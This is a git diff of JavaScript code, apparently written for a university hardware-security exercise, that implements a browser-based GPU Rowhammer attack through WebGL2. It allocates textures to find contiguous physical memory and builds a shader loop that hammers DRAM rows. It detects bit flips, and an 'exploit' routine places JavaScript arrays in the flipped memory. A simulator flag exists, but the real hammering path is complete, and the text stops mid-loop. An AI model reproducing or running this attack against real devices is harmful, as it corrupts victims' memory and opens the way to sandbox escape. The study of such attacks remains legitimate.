@@ -1,10 +1,30 @@
 const INT_MARKER = 0x40414140
 const FIRST_ELEM = 0x50515150
 
+const TEXTURE_NUM = 10000;
+const USE_SIMULATOR = true
+
 
 async function get_tex_data() {
     var result = await $.ajax({
         url: "get_tex_infos",
+     })
+    return JSON.parse(result)
+}
+
+
+async function get_tex_data1() {
+    var result = await $.ajax({
+        // url: "tex.txt",
+        url: "http://localhost:8000/Programowanie/VU/HWSec/Glitch/week4_process/tex.txt",
+    })
+    return JSON.parse(result)
+}
+
+async function get_tex_data2() {
+    var result = await $.ajax({
+        // url: "tex.txt",
+        url: "http://localhost:8000/Programowanie/VU/HWSec/Glitch/week4_process/tex2.txt",
     })
     return JSON.parse(result)
 }
@@ -35,503 +55,479 @@ async function hammer_array(tex_id) {
 // use this function if you use the simulator to initially fill the arrays before triggering the bit flips
 // the first value is set to 0x50515150 to avoid getting matches for all the 0x40414140s.
 
-function fill_arrays(arr, len) {
+async function fill_arrays(arr, len) {
     for (var i = 0; i < len; i++) {
         arr[i] = INT_MARKER;
     }
     arr[0] = FIRST_ELEM;
 }
-
-
-// ========================== STOLEN CODE :) =======================================
-// This code initialize browser and setup correct webgl2 context
-var BrowserDetect = {
-    init: function () {
-      var info = this.searchString(this.dataBrowser) || {identity:"unknown"}
-      this.browser = info.identity;
-      this.version = this.searchVersion(navigator.userAgent)
-          || this.searchVersion(navigator.appVersion)
-          || "an unknown version";
-      this.platformInfo = this.searchString(this.dataPlatform) || this.dataPlatform["unknown"];
-      this.platform = this.platformInfo.identity;
-      var browserInfo = this.urls[this.browser];
-      if (!browserInfo) {
-        browserInfo = this.urls["unknown"];
-      } else if (browserInfo.platforms) {
-        var info = browserInfo.platforms[this.platform];
-        if (info) {
-          browserInfo = info;
-        }
-      }
-      this.urls = browserInfo;
-    },
-    searchString: function (data) {
-      for (var i = 0; i < data.length; i++){
-        var info = data[i];
-        var dataString = info.string;
-        var dataProp = info.prop;
-        this.versionSearchString = info.versionSearch || info.identity;
-        if (dataString) {
-          if (dataString.indexOf(info.subString) != -1) {
-            var shouldExclude = false;
-            if (info.excludeSubstrings) {
-              for (var ii = 0; ii < info.excludeSubstrings.length; ++ii) {
-                if (dataString.indexOf(info.excludeSubstrings[ii]) != -1) {
-                  shouldExclude = true;
-                  break;
-                }
-              }
-            }
-            if (!shouldExclude)
-              return info;
-          }
-        } else if (dataProp) {
-          return info;
-        }
-      }
-    },
-    searchVersion: function (dataString) {
-      var index = dataString.indexOf(this.versionSearchString);
-      if (index == -1) {
-        return;
-      }
-      return parseFloat(dataString.substring(
-          index + this.versionSearchString.length + 1));
-    },
-    dataBrowser: [
-    { string: navigator.userAgent,
-      subString: "Chrome",
-      excludeSubstrings: ["OPR/", "Edge/"],
-      identity: "Chrome"
-    },
-    { string: navigator.userAgent,
-      subString: "OmniWeb",
-      versionSearch: "OmniWeb/",
-      identity: "OmniWeb"
-    },
-    { string: navigator.vendor,
-      subString: "Apple",
-      identity: "Safari",
-      versionSearch: "Version"
-    },
-    { string: navigator.vendor,
-      subString: "Opera",
-      identity: "Opera"
-    },
-    { string: navigator.userAgent,
-      subString: "Android",
-      identity: "Android"
-    },
-    { string: navigator.vendor,
-      subString: "iCab",
-      identity: "iCab"
-    },
-    { string: navigator.vendor,
-      subString: "KDE",
-      identity: "Konqueror"
-    },
-    { string: navigator.userAgent,
-      subString: "Firefox",
-      identity: "Firefox"
-    },
-    { string: navigator.vendor,
-      subString: "Camino",
-      identity: "Camino"
-    },
-    {// for newer Netscapes (6+)
-      string: navigator.userAgent,
-      subString: "Netscape",
-      identity: "Netscape"
-    },
-    { string: navigator.userAgent,
-      subString: "Edge/",
-      identity: "Edge"
-    },
-    { string: navigator.userAgent,
-      subString: "MSIE",
-      identity: "Explorer",
-      versionSearch: "MSIE"
-    },
-    { // for IE11+
-      string: navigator.userAgent,
-      subString: "Trident",
-      identity: "Explorer",
-      versionSearch: "rv"
-    },
-    { string: navigator.userAgent,
-      subString: "Gecko",
-      identity: "Mozilla",
-      versionSearch: "rv"
-    },
-    { // for older Netscapes (4-)
-      string: navigator.userAgent,
-      subString: "Mozilla",
-      identity: "Netscape",
-      versionSearch: "Mozilla"
-    }
-    ],
-    dataPlatform: [
-    { string: navigator.platform,
-      subString: "Win",
-      identity: "Windows",
-      browsers: [
-        {url: "http://www.mozilla.com/en-US/firefox/new/", name: "Mozilla Firefox"},
-        {url: "http://www.google.com/chrome/", name: "Google Chrome"},
-      ]
-    },
-    { string: navigator.platform,
-      subString: "Mac",
-      identity: "Mac",
-      browsers: [
-        {url: "http://www.mozilla.com/en-US/firefox/new/", name: "Mozilla Firefox"},
-        {url: "http://www.google.com/chrome/", name: "Google Chrome"},
-      ]
-    },
-    { string: navigator.userAgent,
-      subString: "iPhone",
-      identity: "iPhone/iPod",
-      browsers: [
-        //{url: "http://www.mozilla.com/en-US/firefox/new/", name: "Mozilla Firefox"}
-      ]
-    },
-    { string: navigator.platform,
-      subString: "iPad",
-      identity: "iPad",
-      browsers: [
-        //{url: "http://www.mozilla.com/en-US/firefox/new/", name: "Mozilla Firefox"}
-      ]
-    },
-    { string: navigator.userAgent,
-      subString: "Android",
-      identity: "Android",
-      browsers: [
-        {url: "https://play.google.com/store/apps/details?id=org.mozilla.firefox", name: "Mozilla Firefox"},
-        {url: "https://play.google.com/store/apps/details?id=com.android.chrome", name: "Google Chrome"}
-      ]
-    },
-    { string: navigator.platform,
-      subString: "Linux",
-      identity: "Linux",
-      browsers: [
-        {url: "http://www.mozilla.com/en-US/firefox/new/", name: "Mozilla Firefox"},
-        {url: "http://www.google.com/chrome/", name: "Google Chrome"},
-      ]
-    },
-    { string: "unknown",
-      subString: "unknown",
-      identity: "unknown",
-      browsers: [
-        {url: "http://www.mozilla.com/en-US/firefox/new/", name: "Mozilla Firefox"},
-        {url: "http://www.google.com/chrome/", name: "Google Chrome"},
-      ]
-    }
-    ],
-    /*
-    upgradeUrl:         Tell the user how to upgrade their browser.
-    troubleshootingUrl: Help the user.
-    platforms:          Urls by platform. See dataPlatform.identity for valid platform names.
-    */
-    urls: {
-      "Chrome": {
-        upgradeUrl: "http://get.webgl.org/webgl2/enable.html#chrome",
-        //upgradeUrl: "http://www.google.com/support/chrome/bin/answer.py?answer=95346",
-        troubleshootingUrl: "http://www.google.com/support/chrome/bin/answer.py?answer=1220892"
-      },
-      "Firefox": {
-        upgradeUrl: "http://get.webgl.org/webgl2/enable.html#firefox",
-        //upgradeUrl: "http://www.mozilla.com/en-US/firefox/new/",
-        troubleshootingUrl: "https://support.mozilla.com/en-US/kb/how-do-i-upgrade-my-graphics-drivers"
-      },
-      "Opera": {
-        platforms: {
-          "Android": {
-            upgradeUrl: "https://market.android.com/details?id=com.opera.browser",
-            troubleshootingUrl: "http://www.opera.com/support/"
-          }
-        },
-        upgradeUrl: "http://www.opera.com/",
-        troubleshootingUrl: "http://www.opera.com/support/"
-      },
-      "Android": {
-        upgradeUrl: null,
-        troubleshootingUrl: null
-      },
-      "Safari": {
-        platforms: {
-          "iPhone/iPod": {
-            upgradeUrl: "http://www.apple.com/ios/",
-            troubleshootingUrl: "http://www.apple.com/support/iphone/"
-          },
-          "iPad": {
-            upgradeUrl: "http://www.apple.com/ios/",
-            troubleshootingUrl: "http://www.apple.com/support/ipad/"
-          },
-          "Mac": {
-            upgradeUrl: "http://www.webkit.org/",
-            troubleshootingUrl: "https://support.apple.com/kb/PH21426"
-          }
-        },
-        upgradeUrl: "http://www.webkit.org/",
-        troubleshootingUrl: "https://support.apple.com/kb/PH21426"
-      },
-      "Explorer": {
-        upgradeUrl: "http://www.microsoft.com/ie",
-        troubleshootingUrl: "http://msdn.microsoft.com/en-us/library/ie/bg182648(v=vs.85).aspx"
-      },
-      "Edge": {
-        upgradeUrl: "http://www.microsoft.com/en-us/windows/windows-10-upgrade",
-        troubleshootingUrl: "http://msdn.microsoft.com/en-us/library/ie/bg182648(v=vs.85).aspx"
-      },
-      "unknown": {
-        upgradeUrl: null,
-        troubleshootingUrl: null
-      }
-    }
-  };
-// ========================== END OF STOLEN CODE :) ==================================
-
-
-function decimalToHexString(number)
-{
-  if (number < 0)
-  {
-    number = 0xFFFFFFFF + number + 1;
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
   }
 
-  return Number(number).toString(16).toUpperCase();
+async function remove_default_textures(default_textures, new_textures){
+    var filtered = new_textures
+    for (let index = 0; index < default_textures.length; index++) {
+        const default_texture = default_textures[index];
+        let gFilter = await default_textures.map(item => {return item.tex_id});
+        return await new_textures.filter(item => !gFilter.includes(item.tex_id));
+        // filtered = await filtered.filter(
+        //     function(value, index, arr){
+        //         return value.pfn != default_texture.pfn;
+        //     }
+        // );
+    }
+    return filtered;
 }
 
-async function main() {
-    // Initialization procedures
-    b = BrowserDetect;
-    b.init();
-    var canvas = document.getElementById('triangleCanvas');
-    var gl = canvas.getContext('webgl2');
-    gl.viewport(0,0,canvas.width,canvas.height);
+async function sort_texture(textures){
+    return textures.sort(function(a, b) {
+        return a.kgsl_entry.pfn - b.kgsl_entry.pfn;
+    });
+}
 
-    // Shaders compilation
-    var vertexShaderSource = `#version 300 es
-    precision mediump float;
-    uniform sampler2D row1;
-    uniform sampler2D row2;
-    uniform int border;
-    //layout (location = 0) in vec3 threadD;
-    uniform sampler2D evict1[9];
-    uniform sampler2D evict2;
-    uniform sampler2D evict3;
-    uniform sampler2D evict4;
-    uniform sampler2D evict5;
-    uniform sampler2D evict6;
-    uniform sampler2D evict7;
-    uniform sampler2D evict8;
-    uniform sampler2D evict9;
-    uniform sampler2D evict10;
-    uniform sampler2D evict11;
-    uniform sampler2D evict12;
-    vec4 val;
-    void main(void){
-    	//int id = int(threadD.x) % 4;
-    	for(int i = 0; i < 1200000; i++){
-    		
-    		 val += texelFetch(row1, ivec2(0, 0), 0); 
-    		 val += texelFetch(row2, ivec2(0, 0), 0) ;
-    		 val += texelFetch(evict1[0], ivec2(0, 0), 0) ;
-    		 val += texelFetch(evict1[6], ivec2(0, 0), 0) ;
-    		 val += texelFetch(evict1[1], ivec2(0, 0), 0) ;
-    		 val += texelFetch(evict1[7], ivec2(0, 0), 0) ;
-    		 val += texelFetch(evict1[2], ivec2(0, 0), 0) ;
-    		 val += texelFetch(evict1[8], ivec2(0, 0), 0) ;
-    		 val += texelFetch(evict1[5], ivec2(0, 0), 0) ;
-    		 val += texelFetch(row1, ivec2(0,0), 0) ;
-    		 val += texelFetch(row2, ivec2(0, 2), 0) ;
-    		 val += texelFetch(evict1[0], ivec2(0, 2), 0) ;
-    		 val += texelFetch(evict1[6], ivec2(0, 2), 0) ;
-    		 val += texelFetch(evict1[1], ivec2(0, 2), 0) ;
-    		 val += texelFetch(evict1[7], ivec2(0, 2), 0) ;
-    		 val += texelFetch(evict1[2], ivec2(0, 2), 0) ;
-    		 val += texelFetch(evict1[8], ivec2(0, 2), 0) ;
-    		 val += texelFetch(evict1[5], ivec2(0, 2), 0) ;
-    	}
-    	gl_Position = val;
-    }`;
-
-
-    var fragmentShaderSource = `#version 300 es
-    precision mediump float;
-    out vec4 FragColor;
-    void main(){
-    	FragColor = vec4(0., 0., 0., 1.);
-    }`;
-    var vertShader = gl.createShader(gl.VERTEX_SHADER);
-    gl.shaderSource(vertShader, vertexShaderSource);
-    gl.compileShader(vertShader);
-    var compiled = gl.getShaderParameter(vertShader, gl.COMPILE_STATUS);
-    if(!compiled){
-        var compilationLog = gl.getShaderInfoLog(vertShader);
-        console.log('Vertex Shader compiler log: ' + compilationLog);
-        return;
-    }
-    var fragShader = gl.createShader(gl.FRAGMENT_SHADER);
-    gl.shaderSource(fragShader, fragmentShaderSource);
-    gl.compileShader(fragShader);
-    var compiled = gl.getShaderParameter(fragShader, gl.COMPILE_STATUS);
-    if(!compiled){
-        var compilationLog = gl.getShaderInfoLog(fragShader);
-        console.log('Fragment Shader compiler log: ' + compilationLog);
-        return;
-    }
-    var prog = gl.createProgram();
-    gl.attachShader(prog, vertShader);
-    gl.attachShader(prog, fragShader);
-    gl.linkProgram(prog);
-
-    // Textures allocation
-    var texs = [];
-    
-    var texdata = []; // data has to be not null. could be on demand allocation
-    for(var i = 0; i < 32; ++i) for(var j  = 0; j < 32; ++j) for(var bt = 0; bt < 4; ++bt) texdata.push(0xff)
-    texdata = new Uint8Array(texdata);
-
-    var zerotexdata = []; // data has to be not null. could be on demand allocation
-    for(var i = 0; i < 32; ++i) for(var j  = 0; j < 32; ++j) for(var bt = 0; bt < 4; ++bt) zerotexdata.push(0x0)
-    zerotexdata = new Uint8Array(zerotexdata);
-    get_tex_data().then(function(data){
-        var old_kgsl = data;
-        for (var i = 0; i < 20000; ++i){
-            texs.push(gl.createTexture())
-            gl.bindTexture(gl.TEXTURE_2D, texs[i]);
-            var level = 0;
-            var internalFormat = gl.RGBA;
-            var border = 0;
-            var format = gl.RGBA;
-            var type = gl.UNSIGNED_BYTE;
-           
-            gl.texImage2D(gl.TEXTURE_2D, level, internalFormat,
-                            32, 32, border,
-                            format, type, texdata);
-     
-            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
-            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);
-            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST);
-            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST);
-            // gl.texSubImage2D(gl.TEXTURE_2D, 0, 0, 0, 1, 0, format, type, new Uint8Array([0xffffffff,0xffffffff,0xffffffff]));
+async function addConsecutiveFieldToTexture(textures){
+    var prev_pfn = 0;
+    var consecutive_pfns_no = 0;
+    for (let index = 0; index < textures.length; index++) {
+        if(prev_pfn != textures[index].kgsl_entry.pfn - 1 ){
+            consecutive_pfns_no = 0;
+            textures[index].kgsl_entry.consecutive_id = 0;
+            prev_pfn = textures[index].kgsl_entry.pfn;
+            continue;
         }
-    
-        // Since all textures are really allocated in DRAM, now it's time to identify contigious chunks of memory
-    
-        var FBF = gl.createFramebuffer();
-        var kgsl = {}
-        get_tex_data().then(function(data){
-            /* Example of kgsl entry
-            * {
-            * pfn: 28576
-            * tex_id: 112
-            * tex_size: 1114112
-            * v_addr: 2237923328
-            * }
-            */
-            kgsl = data; 
-            kgsl = kgsl.sort(function(a, b){return a.pfn > b.pfn}); // asc order by pfns
-            var startID = 0xffffffffffff;
+        consecutive_pfns_no += 1;
+        textures[index].kgsl_entry.consecutive_id = consecutive_pfns_no;
+        prev_pfn = textures[index].kgsl_entry.pfn
+    }
+    return textures
+}
 
-            for(var ent in kgsl){
-                if(old_kgsl.findIndex(function(element, index, arr){
-                        if(element.tex_id == ent.tex_id)
-                                return true;
-                }) >= 0) continue;
-                if(startID > ent.tex_id) startID = ent.tex_id;
-            }
+async function filterOrderBiggerThan6(textures){
+    var chunks_array = []
+    for (let index = textures.length-1; index >= 0; index--) {
+        if(textures[index].kgsl_entry.consecutive_id >= 64){
+            chunks_array.push(textures.slice(index - textures[index].kgsl_entry.consecutive_id, index+1));
+            index = index - textures[index].kgsl_entry.consecutive_id;
+        }
+    }
+    // console.log("chunks array size:" + chunks_array.length)
+    // console.log("chunks array: " + JSON.stringify(chunks_array))
+    return chunks_array;
+}
 
-            var kgslmap = []
-            var counter = 1;
-            for(var i = 1; i < kgsl.length; ++i){
-                // console.log("DIFF : " + (kgsl[i].pfn - kgsl[i - 1].pfn));
-                if(kgsl[i].pfn - kgsl[i - 1].pfn == 1){
-                    ++counter;
-                    if(counter == 64){
-                        counter = 1;
-                        kgslmap.push(i - 64);
-                    }
-                } else {
-                    counter = 1;
-                } 
+function getPhysicalAddress(v_addr, pfn){    
+    return (pfn * 4096) + (v_addr % 4096);
+}
+
+function getBankNum(paddr){
+    var bits = 1 << 13 | 1 << 14 |1 << 15;  
+    var imm_addr = (paddr & bits) >> 13;
+    return imm_addr;
+}
+
+async function new_print_texture_and_check(texture){
+    var frame = new Uint8Array(32*32*4);
+    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, texture.native_texture, 0);
+    while(gl.checkFramebufferStatus(gl.FRAMEBUFFER) != gl.FRAMEBUFFER_COMPLETE) {
+        await sleep(10)
+    }
+    gl.readPixels(0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, frame);
+
+    for (let index = 0; index < 4096; index++) {
+        if(frame[index] != 0xff){
+            console.log("HAMMER DETECTED in "+JSON.stringify(texture)+"\nframe["+index+"]="+frame[index])
+            return true
+        }
+    }
+    return false
+}
+
+
+// function check_values(frame){
+//     for (let index = 0; index < 4096; index++) {
+//         if(frame[index] != 0xff){
+//             console.log("HAMMER DETECTED = " + frame[index])
+//         }
+//     }
+// }
+
+async function new_print(texture){
+    var frame = new Uint8Array(32*32*4);
+    for (let index = 0; index < 32*32*4; index++) {
+        frame[index] = 5; // 4 is just for testing
+    }
+    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, texture.native_texture, 0);
+    while(gl.checkFramebufferStatus(gl.FRAMEBUFFER) != gl.FRAMEBUFFER_COMPLETE) {
+        await sleep(500)
+    }
+    console.log("new print")
+    var str  = '';
+    gl.readPixels(0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, frame);
+    for (let index = 0; index < 4096; index++) {
+        str += frame[index] + ", "
+        if(index % (32*4) == 0) str += "\n"
+    }
+    console.log(str)
+}
+
+async function createShaders(gl){
+    var vertCode =
+    "#version 300 es\n" +
+    "layout (location = 0) in vec3 aPos;\n" +
+    "uniform sampler2D tex0;\n" +
+    "uniform sampler2D tex1;\n" +
+    "uniform sampler2D tex2;\n" +
+    "uniform sampler2D tex3;\n" +
+    "uniform sampler2D tex4;\n" +
+    "uniform sampler2D tex5;\n" +
+    "uniform sampler2D tex6;\n" +
+    "uniform sampler2D tex32;\n" +
+    "uniform sampler2D tex33;\n" +
+    // "uniform ivec2 tex_id;\n"
+    "out float val_g;\n" +
+    "\n" +
+    "void main() {\n" +
+    "float val = 0.0;\n" +
+    "for (uint i = 0u; i < 1300000u; i++) { \n" + // 1300000u 
+    // Step 1
+    "   val += texelFetch(tex0, ivec2(0, 0), 0).r;\n" +
+    "   val += texelFetch(tex32, ivec2(0, 0), 0).r;\n" +
+    "   val += texelFetch(tex1, ivec2(0, 0), 0).r;\n" +
+    "   val += texelFetch(tex33, ivec2(0, 0), 0).r;\n" +
+    "   val += texelFetch(tex2, ivec2(0, 0), 0).r;\n" +
+    "   val += texelFetch(tex3, ivec2(0, 0), 0).r;\n" +
+    "   val += texelFetch(tex4, ivec2(0, 0), 0).r;\n" +
+    "   val += texelFetch(tex5, ivec2(0, 0), 0).r;\n" +
+    "   val += texelFetch(tex6, ivec2(0, 0), 0).r;\n" +
+
+    // Step 2
+    "   val += texelFetch(tex0, ivec2(0, 2), 0).r;\n" +
+    "   val += texelFetch(tex32, ivec2(0, 2), 0).r;\n" +
+    "   val += texelFetch(tex1, ivec2(0, 2), 0).r;\n" +
+    "   val += texelFetch(tex33, ivec2(0, 2), 0).r;\n" +
+    "   val += texelFetch(tex2, ivec2(0, 2), 0).r;\n" +
+    "   val += texelFetch(tex3, ivec2(0, 2), 0).r;\n" +
+    "   val += texelFetch(tex4, ivec2(0, 2), 0).r;\n" +
+    "   val += texelFetch(tex5, ivec2(0, 2), 0).r;\n" +
+    "   val += texelFetch(tex6, ivec2(0, 2), 0).r;\n" +
+    
+    "}\n" +
+    // "   gl_Position = vec4(-0.99, -0.99, 0, 1);\n" +
+    "   val_g = val;\n" +
+    "   gl_Position = vec4(0,0,0,0);\n" +
+    "}\n";
+
+    var fragCode = 
+    "#version 300 es\n" +
+    "precision mediump float;\n" + 
+    "out vec4 FragColor;\n" +
+    
+    "in float val_g;\n" +
+    // "uniform ivec2 loop_i;\n"
+    "void main()\n" +
+    "{\n" +
+    "FragColor= vec4(val_g, 0, 0, 0);\n" +
+    // "FragColor= vec4(0.4, 0.5, 0.6, 0);\n" +
+    "}\n";
+
+    
+    var vertShader = gl.createShader(gl.VERTEX_SHADER);
+    gl.shaderSource(vertShader, vertCode);
+    gl.compileShader(vertShader);
+    if(gl.getShaderParameter(vertShader, gl.COMPILE_STATUS) == false){
+        console.log("vertShader failed!!")
+        var info = gl.getShaderInfoLog(vertShader);
+        throw 'Could not compile vertShader program. \n\n' + info;
+    }
+
+    var fragShader = gl.createShader(gl.FRAGMENT_SHADER);
+    gl.shaderSource(fragShader, fragCode);
+    gl.compileShader(fragShader);
+    if(gl.getShaderParameter(fragShader, gl.COMPILE_STATUS) == false){
+        console.log("fragShader failed!!")
+        var info = gl.getShaderInfoLog(fragShader);
+        throw 'Could not compile fragShader program. \n\n' + info;        
+    }
+
+    shaderProgram = gl.createProgram();
+    gl.attachShader(shaderProgram, vertShader); 
+    gl.attachShader(shaderProgram, fragShader);
+    gl.linkProgram(shaderProgram);
+    if ( !gl.getProgramParameter( shaderProgram, gl.LINK_STATUS) ) {
+        var info = gl.getProgramInfoLog(shaderProgram);
+        throw 'Could not compile WebGL program. \n\n' + info;
+      }
+    gl.useProgram(shaderProgram);
+
+}
+
+async function defineGeometry(gl){
+    var vertices = [-0.5, 0.5, -0.5, -0.5, 0.0, -0.5,];
+    // var VAO = gl.createVertexArray();
+    var VBO = gl.createBuffer();
+    // gl.bindVertexArray(VAO);
+
+    gl.bindBuffer(gl.ARRAY_BUFFER, VBO);
+    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(vertices), gl.STATIC_DRAW);
+    gl.bindBuffer(gl.ARRAY_BUFFER, null);
+}
+
+async function generateTextures(gl){
+    var textures = [TEXTURE_NUM]
+
+    var textures_data = new Uint8Array(32*32*4);
+    for (let index = 0; index < 32*32*4; index++) {
+        textures_data[index] = 2; // 4 is just for testing
+    }
+    for (let index = 0; index < TEXTURE_NUM; index++) {
+        // for (let index2 = 0; index2 < 32*32*4; index2++) {
+        //     textures_data[index2] = index % 255;
+        // }
+        let texture = gl.createTexture();
+        gl.bindTexture(gl.TEXTURE_2D, texture);
+
+        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 32, 32, 0, gl.RGBA, gl.UNSIGNED_BYTE, textures_data);
+
+        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
+        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);
+        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST);
+        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST);
+        textures[index] = texture
+    }
+    return textures;
+}
+
+async function generate1Teture(gl) {
+    let texture = gl.createTexture();
+    gl.bindTexture(gl.TEXTURE_2D, texture);
+
+    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 32, 32, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+
+    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
+    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);
+    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST);
+    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST);
+    gl.bindTexture(gl.TEXTURE_2D, null);
+    return texture
+}
+
+
+async function fill_texture_with_bytes(value, texture_id){
+    var textures_data = new Uint8Array(32*32*4);
+    for (let index = 0; index < 32*32*4; index++) {
+        textures_data[index] = value;
+    }
+    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, null, 0)
+    gl.bindTexture(gl.TEXTURE_2D, texture_id);
+    
+    gl.texSubImage2D(
+        gl.TEXTURE_2D, 0, 0, 0,
+        32, 32, gl.RGBA,
+        gl.UNSIGNED_BYTE, textures_data);
+    gl.bindTexture(gl.TEXTURE_2D, null);
+}
+
+
+async function prepare_texture_content_for_hammering(chunk){
+    await fill_texture_with_bytes(0, chunk[0].native_texture);
+    await fill_texture_with_bytes(0, chunk[1].native_texture);
+    await fill_texture_with_bytes(0xff, chunk[16].native_texture);
+    await fill_texture_with_bytes(0xff, chunk[17].native_texture);
+    await fill_texture_with_bytes(0, chunk[32].native_texture);
+    await fill_texture_with_bytes(0, chunk[33].native_texture);
+}
+
+async function hammer_chunk(mProgram, relative_chunk) {
+
+    if(USE_SIMULATOR){
+        await hammer_tex(relative_chunk[16].kgsl_entry.tex_id)
+        return
+    }
+
+
+    gl.uniform1i(gl.getUniformLocation(mProgram, "tex0"), 0);
+    gl.uniform1i(gl.getUniformLocation(mProgram, "tex1"), 1);
+    gl.uniform1i(gl.getUniformLocation(mProgram, "tex2"), 2);
+    gl.uniform1i(gl.getUniformLocation(mProgram, "tex3"), 3);
+    gl.uniform1i(gl.getUniformLocation(mProgram, "tex4"), 4);
+    gl.uniform1i(gl.getUniformLocation(mProgram, "tex5"), 5);
+    gl.uniform1i(gl.getUniformLocation(mProgram, "tex6"), 6);
+    gl.uniform1i(gl.getUniformLocation(mProgram, "tex32"), 7);
+    gl.uniform1i(gl.getUniformLocation(mProgram, "tex33"), 8);
+
+
+    gl.activeTexture(gl.TEXTURE0);
+    gl.bindTexture(gl.TEXTURE_2D, relative_chunk[0].native_texture);
+
+    gl.activeTexture(gl.TEXTURE1);
+    gl.bindTexture(gl.TEXTURE_2D, relative_chunk[1].native_texture);
+
+    gl.activeTexture(gl.TEXTURE2);
+    gl.bindTexture(gl.TEXTURE_2D, relative_chunk[2].native_texture);
+
+    gl.activeTexture(gl.TEXTURE3);
+    gl.bindTexture(gl.TEXTURE_2D, relative_chunk[3].native_texture);
+
+    gl.activeTexture(gl.TEXTURE4);
+    gl.bindTexture(gl.TEXTURE_2D, relative_chunk[4].native_texture);
+
+    gl.activeTexture(gl.TEXTURE5);
+    gl.bindTexture(gl.TEXTURE_2D, relative_chunk[5].native_texture);
+
+    gl.activeTexture(gl.TEXTURE6);
+    gl.bindTexture(gl.TEXTURE_2D, relative_chunk[6].native_texture);
+
+    gl.activeTexture(gl.TEXTURE7);
+    gl.bindTexture(gl.TEXTURE_2D, relative_chunk[32].native_texture);
+
+    gl.activeTexture(gl.TEXTURE8);
+    gl.bindTexture(gl.TEXTURE_2D, relative_chunk[33].native_texture);
+
+    gl.drawArrays( gl.POINTS, 0, 1);
+}
+
+async function remove_2048textures(used_textures, all_textures){
+    let gFilter = await used_textures.map(item => {return item.tex_id});
+    await sleep(200)
+    let textures_to_remove = await all_textures.filter(item => !gFilter.includes(item.kgsl_entry.tex_id));
+    for (let index = 0; index < 2048; index++) {
+        const element = textures_to_remove[index];
+        gl.deleteTexture(element.native_texture);
+    }
+}
+
+async function check_arrays(arr, len) {
+    for (var i = 1; i < len; i++) {
+        if(arr[i] != INT_MARKER){
+            console.log("Different mark at: " + arr[i])
+        }
+    }
+    arr[0] = FIRST_ELEM;
+}
+
+async function exploit(relative_chunk){
+    gl.deleteTexture(relative_chunk[16].native_texture);
+    let arrays = [];
+    for (let i = 0; i < 1000; i++) { // create 100 arrays
+        let arr = [];
+        await fill_arrays(arr, 1024);
+        arrays.push(arr);
+    }
+    await hammer_array(relative_chunk[16].kgsl_entry.tex_id)
+    for (let i = 0; i < 100; i++) {
+        await check_arrays(arrays[i], 100)
+    }
+
+    console.log("Done")
+}
+
+
+
+
+async function main() {
+    /* Set up environment */
+    var canvas = document.getElementById('canvas');
+    gl = canvas.getContext('webgl2');
+    await createShaders(gl)
+    await defineGeometry(gl)
+
+    new Uint8Array(32*32*4)
+    
+    /* Get textures */
+    console.log("Downloading default textures")
+    let textures_default = await get_tex_data();
+   
+    // console.log("textures_default:\n" + JSON.stringify(textures_default))
+    let native_textures = await generateTextures(gl)
+    sleep(1000)
+    
+    console.log("Downloading new textures")
+    let textures_new = await get_tex_data();
+    textures_new = textures_new.reverse()
+    // console.log("textures_new:\n" + JSON.stringify(textures_new))
+
+    /* Filter textures */
+    console.log("Analizing textures")
+    let textures_ours = await remove_default_textures(textures_default, textures_new)
+    let textures = [textures_ours.length];
+    
+    native_textures = native_textures.slice(
+        TEXTURE_NUM - textures_ours.length, // calcute real amount of textures
+        TEXTURE_NUM ) // need to slice, because we get another value from new_textures
+    textures_ours.forEach((val, index) => {
+        val.bank = getBankNum(
+            getPhysicalAddress(val.v_addr, val.pfn)
+        )
+        textures[index] = {
+        native_texture: native_textures[index],
+        kgsl_entry: val
+       };
+    });
+
+    
+    textures = await sort_texture(textures)
+    var chunks_array_not_filtered = await addConsecutiveFieldToTexture(textures)
+    var chunks_array = await filterOrderBiggerThan6(textures)
+    console.log("textures.length:\n" + JSON.stringify(textures.length))
+
+    /* Create framebuffer */
+    const fbo = gl.createFramebuffer();
+    gl.bindFramebuffer(gl.FRAMEBUFFER, fbo);
+
+    /* Create texture_output */
+    var texture_hammer_output = await generate1Teture(gl)
+    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, texture_hammer_output, 0)
+    
+    /* Bind framebuffer */
+    gl.bindFramebuffer(gl.FRAMEBUFFER, fbo);
+    await sleep(10)
+    console.log("Start hammering")
+    /* Hammer chunks */
+    for (let chunk_i = 0; chunk_i < chunks_array.length; chunk_i++) {
+        const chunk = chunks_array[chunk_i];
+        // ex. for length=64, We should't go beyond (64-32=32) because it would overlap other textures
+
